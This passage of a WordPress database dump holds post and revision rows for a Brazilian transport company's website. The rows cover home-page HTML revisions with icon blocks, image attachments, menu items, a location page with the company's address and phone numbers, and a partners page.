'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 18:24:33', '2015-03-18 21:24:33', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(58, 1, '2015-03-18 18:27:14', '2015-03-18 21:27:14', '<div class=\"home1\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\" />\r\n	</a>\r\n\r\n	<h3>Visão, Missão e Valores</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home2\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Serviços</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home3\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Parceiros</h3>\r\n\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 18:27:14', '2015-03-18 21:27:14', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(61, 1, '2015-03-18 18:46:43', '2015-03-18 21:46:43', '<div class=\"home1\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n		<img src=\"\" />\r\n	</a>\r\n\r\n	<h3>Visão, Missão e Valores</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home2\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n		<img src=\"\" />\r\n	</a>\r\n\r\n	<h3>Nossos Serviços</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home3\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/engrenagem.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Parceiros</h3>\r\n\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 18:46:43', '2015-03-18 21:46:43', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(63, 1, '2015-03-18 19:25:22', '2015-03-18 22:25:22', '<div class=\"home1\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n		<img src=\"\" />\r\n	</a>\r\n\r\n	<h3>Visão, Missão e Valores</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home2\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/engrenagem.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Serviços</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home3\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/handshake-256.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Parceiros</h3>\r\n\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 19:25:22', '2015-03-18 22:25:22', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(64, 1, '2015-03-18 19:36:59', '2015-03-18 22:36:59', '', '1426735922_vector_65_12-128', '', 'inherit', 'open', 'open', '', '1426735922_vector_65_12-128', '', '', '2015-03-18 19:36:59', '2015-03-18 22:36:59', '', 46, 'http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png', 0, 'attachment', 'image/png', 0),
(65, 1, '2015-03-18 19:37:30', '2015-03-18 22:37:30', '<div class=\"home1\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n		<img src=\"\" />\r\n	</a>\r\n\r\n	<h3>Visão, Missão e Valores</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home2\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/engrenagem.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Serviços</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home3\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Parceiros</h3>\r\n\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 19:37:30', '2015-03-18 22:37:30', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(66, 1, '2015-03-18 19:41:46', '2015-03-18 22:41:46', '', '1426736366_free-14-128', '', 'inherit', 'open', 'open', '', '1426736366_free-14-128', '', '', '2015-03-18 19:41:46', '2015-03-18 22:41:46', '', 46, 'http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png', 0, 'attachment', 'image/png', 0),
(67, 1, '2015-03-18 19:42:10', '2015-03-18 22:42:10', '<div class=\"home1\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n		<img src=\"\" />\r\n	</a>\r\n\r\n	<h3>Visão, Missão e Valores</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home2\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Serviços</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home3\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Parceiros</h3>\r\n\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 19:42:10', '2015-03-18 22:42:10', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(68, 1, '2015-03-18 19:46:21', '2015-03-18 22:46:21', '', '1426736601_698368-icon-137-document-certificate-128', '', 'inherit', 'open', 'open', '', '1426736601_698368-icon-137-document-certificate-128', '', '', '2015-03-18 19:46:21', '2015-03-18 22:46:21', '', 46, 'http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png', 0, 'attachment', 'image/png', 0),
(69, 1, '2015-03-18 19:46:33', '2015-03-18 22:46:33', '<div class=\"home1\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\" />\r\n	</a>\r\n\r\n	<h3>Visão, Missão e Valores</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home2\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Serviços</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home3\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Parceiros</h3>\r\n\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 19:46:33', '2015-03-18 22:46:33', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(70, 1, '2015-03-18 20:16:45', '2015-03-18 23:16:45', '<div id=\"home\">\r\n<div class=\"home1\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\" />\r\n	</a>\r\n\r\n	<h3>Visão, Missão e Valores</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home2\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Serviços</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home3\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Parceiros</h3>\r\n\r\n</div>\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 20:16:45', '2015-03-18 23:16:45', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(71, 1, '2015-03-18 20:53:28', '2015-03-18 23:53:28', '<div class=\"home1\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\" />\r\n	</a>\r\n\r\n	<h3>Visão, Missão e Valores</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home2\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Serviços</h3>\r\n\r\n</div>\r\n\r\n<div class=\"home3\">\r\n	<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n		<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n	</a>\r\n\r\n	<h3>Nossos Parceiros</h3>\r\n\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 20:53:28', '2015-03-18 23:53:28', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(72, 1, '2015-03-18 20:56:53', '2015-03-18 23:56:53', '<div class=\"home\">\r\n	<div class=\"home1\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\" />\r\n		</a>\r\n\r\n		<h3>Visão, Missão e Valores</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"home2\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n		</a>\r\n\r\n		<h3>Nossos Serviços</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"home3\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n		</a>\r\n\r\n		<h3>Nossos Paceiros</h3>\r\n\r\n	</div>\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 20:56:53', '2015-03-18 23:56:53', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(73, 1, '2015-03-18 20:57:44', '2015-03-18 23:57:44', '<div class=\"home-ywc\">\r\n	<div class=\"home1\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\" />\r\n		</a>\r\n\r\n		<h3>Visão, Missão e Valores</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"home2\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n		</a>\r\n\r\n		<h3>Nossos Serviços</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"home3\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n		</a>\r\n\r\n		<h3>Nossos Paceiros</h3>\r\n\r\n	</div>\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-18 20:57:44', '2015-03-18 23:57:44', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(74, 1, '2015-03-19 01:00:05', '2015-03-19 04:00:05', '<div class=\"home-ywc\">\r\n	<div class=\"home1\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\" />\r\n		</a>\r\n\r\n		<h3>Visão, Missão e Valores</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"home1\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n		</a>\r\n\r\n		<h3>Nossos Serviços</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"home1\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n		</a>\r\n\r\n		<h3>Nossos Paceiros</h3>\r\n\r\n	</div>\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-19 01:00:05', '2015-03-19 04:00:05', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(75, 1, '2015-03-19 11:24:06', '2015-03-19 14:24:06', '<div class=\"col-md-4\">\r\n	<div class=\"home1\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\" />\r\n		</a>\r\n\r\n		<h3>Visão, Missão e Valores</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"home1\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n		</a>\r\n\r\n		<h3>Nossos Serviços</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"home1\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n		</a>\r\n\r\n		<h3>Nossos Paceiros</h3>\r\n\r\n	</div>\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-19 11:24:06', '2015-03-19 14:24:06', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(76, 1, '2015-03-19 11:33:27', '2015-03-19 14:33:27', '<div class=\"col-md-4\">\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\" />\r\n		</a>\r\n\r\n		<h3>Visão, Missão e Valores</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n		</a>\r\n\r\n		<h3>Nossos Serviços</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n		</a>\r\n\r\n		<h3>Nossos Paceiros</h3>\r\n\r\n	</div>\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-19 11:33:27', '2015-03-19 14:33:27', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(77, 1, '2015-03-19 11:34:33', '2015-03-19 14:34:33', '<div class=\"home-ywc\">\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\" />\r\n		</a>\r\n\r\n		<h3>Visão, Missão e Valores</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n		</a>\r\n\r\n		<h3>Nossos Serviços</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n		</a>\r\n\r\n		<h3>Nossos Paceiros</h3>\r\n\r\n	</div>\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-19 11:34:33', '2015-03-19 14:34:33', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(78, 1, '2015-03-19 12:19:39', '2015-03-19 15:19:39', '<div class=\"home-ywc\">\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\" />\r\n		</a>\r\n\r\n		<h3 class=\"home-ywc\">Visão, Missão e Valores</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n		</a>\r\n\r\n		<h3 class=\"home-ywc\">Nossos Serviços</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n		</a>\r\n\r\n		<h3 class=\"home-ywc\">Nossos Paceiros</h3>\r\n\r\n	</div>\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-19 12:19:39', '2015-03-19 15:19:39', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(79, 1, '2015-03-19 12:21:51', '2015-03-19 15:21:51', '<div class=\"home-ywc\">\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n			<img class=\"col-md-4\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\"  />\r\n		</a>\r\n\r\n		<h3 class=\"home-ywc\">Visão, Missão e Valores</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n		</a>\r\n\r\n		<h3 class=\"home-ywc\">Nossos Serviços</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n			<img src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n		</a>\r\n\r\n		<h3 class=\"home-ywc\">Nossos Paceiros</h3>\r\n\r\n	</div>\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-19 12:21:51', '2015-03-19 15:21:51', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(80, 1, '2015-03-19 12:22:44', '2015-03-19 15:22:44', '<div class=\"home-ywc\">\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n			<img class=\"col-md-4\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\"  />\r\n		</a>\r\n\r\n		<h3 class=\"home-ywc\">Visão, Missão e Valores</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n			<img class=\"col-md-4\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n		</a>\r\n\r\n		<h3 class=\"home-ywc\">Nossos Serviços</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n			<img class=\"col-md-4\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n		</a>\r\n\r\n		<h3 class=\"home-ywc\">Nossos Paceiros</h3>\r\n\r\n	</div>\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-19 12:22:44', '2015-03-19 15:22:44', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(81, 1, '2015-03-19 12:29:18', '2015-03-19 15:29:18', '<div class=\"home-ywc\">\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729589_Discount.png\">\r\n			<img class=\"col-md-3\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736601_698368-icon-137-document-certificate-128.png\"  />\r\n		</a>\r\n\r\n		<h3 class=\"home-ywc\">Visão, Missão e Valores</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729565_Like.png\">\r\n			<img class=\"col-md-3\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426736366_free-14-128.png\" />\r\n		</a>\r\n\r\n		<h3 class=\"home-ywc\">Nossos Serviços</h3>\r\n\r\n	</div>\r\n\r\n	<div class=\"col-md-4\">\r\n		<a href=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1425729515_Delivery.png\">\r\n			<img class=\"col-md-3\" src=\"http://araujotrans.com.br/wp-content/uploads/2015/03/1426735922_vector_65_12-128.png\" />\r\n		</a>\r\n\r\n		<h3 class=\"home-ywc\">Nossos Paceiros</h3>\r\n\r\n	</div>\r\n</div>', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-19 12:29:18', '2015-03-19 15:29:18', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(83, 1, '2015-03-19 13:48:03', '2015-03-19 16:48:03', ' ', '', '', 'publish', 'open', 'closed', '', '83', '', '', '2016-07-11 11:28:08', '2016-07-11 14:28:08', '', 0, 'http://araujotrans.com.br/?p=83', 2, 'nav_menu_item', '', 0),
(85, 1, '2015-03-19 13:54:28', '2015-03-19 16:54:28', '<strong>Venha nos visitar!</strong>\r\n\r\nRua Amaro Leite, 374\r\n<strong>CEP:</strong> 04763-060 – Socorro, São Paulo/SP\r\n<strong>Tel:</strong> (11) 25971454 / (11) 25971463\r\n<strong>Horário de Funcionamento:</strong> segunda a sexta das 08:00 – 18:00\r\n[huge_it_maps id=\"1\"]', 'Localização', '', 'publish', 'open', 'open', '', 'localizacao', '', '', '2016-07-30 17:19:12', '2016-07-30 20:19:12', '', 0, 'http://araujotrans.com.br/?page_id=85', 0, 'page', '', 0),
(86, 1, '2015-03-19 13:54:28', '2015-03-19 16:54:28', '', 'Localização', '', 'inherit', 'open', 'open', '', '85-revision-v1', '', '', '2015-03-19 13:54:28', '2015-03-19 16:54:28', '', 85, 'http://araujotrans.com.br/85-revision-v1/', 0, 'revision', '', 0),
(87, 1, '2015-03-19 13:59:36', '2015-03-19 16:59:36', ' ', '', '', 'publish', 'open', 'open', '', '87', '', '', '2015-04-09 00:03:18', '2015-04-09 03:03:18', '', 0, 'http://araujotrans.com.br/?p=87', 5, 'nav_menu_item', '', 0),
(88, 1, '2015-03-19 14:00:50', '2015-03-19 17:00:50', ' ', '', '', 'publish', 'open', 'closed', '', '88', '', '', '2016-07-11 11:28:08', '2016-07-11 14:28:08', '', 0, 'http://araujotrans.com.br/?p=88', 1, 'nav_menu_item', '', 0),
(89, 1, '2015-03-19 14:04:39', '2015-03-19 17:04:39', '[si-contact-form form=\'1\']', 'Fale conosco', '', 'inherit', 'open', 'open', '', '30-revision-v1', '', '', '2015-03-19 14:04:39', '2015-03-19 17:04:39', '', 30, 'http://araujotrans.com.br/30-revision-v1/', 0, 'revision', '', 0),
(90, 1, '2015-03-19 15:12:29', '2015-03-19 18:12:29', '', 'Home', '', 'inherit', 'open', 'open', '', '46-revision-v1', '', '', '2015-03-19 15:12:29', '2015-03-19 18:12:29', '', 46, 'http://araujotrans.com.br/46-revision-v1/', 0, 'revision', '', 0),
(91, 1, '2015-03-19 15:14:33', '2015-03-19 18:14:33', 'Através dos anos fomos fazendo parcerias muito importantes para o crescimento da Araújo Transportes. Não podemos esquecer dessas parcerias tão importantes neste momento. Conheça alguns de nossos parceiros e faça parte desse sucesso!\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.boxjoanninha.com.br/novo/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/box_joaninha-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.decisivacontabil.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/Decesiva-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.joanninha.com.br/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/04/joaninha-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.mandae.com.br/\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/mandae-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.sorvetenaked.com.br/\" target=\"_blank\"><img src=\"http://www.araujotrans.com.br/wp-content/uploads/2015/03/Naked-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"http://www.phoenixmecano.com.br/produtos.php?gclid=Cj0KEQjw0fOoBRDn88Pol8bqhN0BEiQARGVJKmpkHgpcni99UxyEPRz4QgeNujAVllLDu94JfU3yVx4aAmlL8P8HAQ\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/phoenix-150x150.jpg\" /></a></div>\r\n\r\n<div class=\"parceiros\"><a href=\"#\" target=\"_blank\"><img src=\"http://araujotrans.com.br/wp-content/uploads/2015/04/via-150x150.jpg\" /></a></div>\r\n\r\n', 'Parceiros', '', 'publish', 'open', 'open', '', 'parceiros', '', '', '2015-04-15 14:48:04', '2015-04-15 17:48:04', '', 0, 'http://araujotrans.com.br/?page_id=91', 0, 'page', '', 0),
(92, 1, '2015-03-19 15:14:33', '2015-03-19 18:14:33', '', 'Parceiros', '', 'inherit', 'open', 'open', '', '91-revision-v1', '', '', '2015-03-19 15:14:33', '2015-03-19 18:14:33', '', 91, 'http://araujotrans.com.br/91-revision-v1/', 0, 'revision', '', 0),
